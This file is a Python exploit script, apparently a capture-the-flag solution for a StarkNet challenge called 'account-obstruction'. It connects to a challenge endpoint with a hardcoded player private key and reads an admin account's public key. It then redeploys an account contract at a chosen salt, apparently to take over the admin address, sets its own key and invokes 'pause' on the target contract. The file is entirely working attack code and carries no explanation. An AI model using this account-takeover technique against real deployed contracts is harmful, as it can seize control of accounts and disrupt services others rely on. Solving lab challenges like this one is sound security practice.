# Usage:
import asyncio
import json
import os
import subprocess
from pathlib import Path

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.signer.stark_curve_signer import KeyPair
from starknet_py.transactions.deploy import make_deploy_tx
from starkware.starknet.definitions.general_config import StarknetChainId
from starkware.starknet.public.abi import get_selector_from_name

uuid = "c9d959dd-e0ab-47df-ae1e-3fd1d7940dff"
endpoint = "http://c9d959dd-e0ab-47df-ae1e-3fd1d7940dff@18.157.198.111:5051"
private_key = "0x8a22802a5f47abf542194d05e714475"
player_address = "0x3cf85087a0b1fdee91afe9e2c42a5ecb6dea5aa685d1c879774428317a32a6c"
contract_address = "0x673961dfca6eeb8c07579974f970cf0d61c6e1a8389b23ee7dbcb463216440a"

private_key = int(private_key, 16)
player_address = int(player_address, 16)


async def run():

    gateway_client = GatewayClient(net=endpoint, chain=StarknetChainId.TESTNET)
    account_client = AccountClient(
        address=player_address,
        client=gateway_client,
        chain=StarknetChainId.TESTNET,
        key_pair=KeyPair.from_private_key(private_key),
        supported_tx_version=1,
    )

    contract = await Contract.from_address(contract_address, account_client)
    admin = await Contract.from_address(
        3351906084215946721898793036190880870882020375377251832461900192322724599681,
        account_client,
    )
    admin.data.abi
    await admin.functions["getPublicKey"].call()

    # account_class = await gateway_client.get_class_hash_at(admin.address)
    # bytecode = (await gateway_client.get_code(admin.address)).bytecode
    # compiled_contract = await gateway_client.get_class_by_hash(account_class)
    admin_deployment = await Contract.deploy(
        client=account_client,
        compiled_contract=Path("account-obstruction/build/Account.json").read_text(),
        constructor_args=[
            1868321919106442055173355261247575744522155493610515503615668231781156211452
        ],
        salt=2312,
    )
    await admin_deployment.wait_for_acceptance()
    admin_deployment.deployed_contract.address
    tx = await admin_deployment.deployed_contract.functions["setPublicKey"].invoke(
        KeyPair.from_private_key(private_key).public_key, max_fee=int(1e16)
    )
    await tx.wait_for_acceptance()

    await contract.functions["owner"].call()
    tx = await contract.functions["pause"].invoke(max_fee=int(1e16))
    await tx.wait_for_acceptance()


if __name__ == "__main__":
    asyncio.run(run())
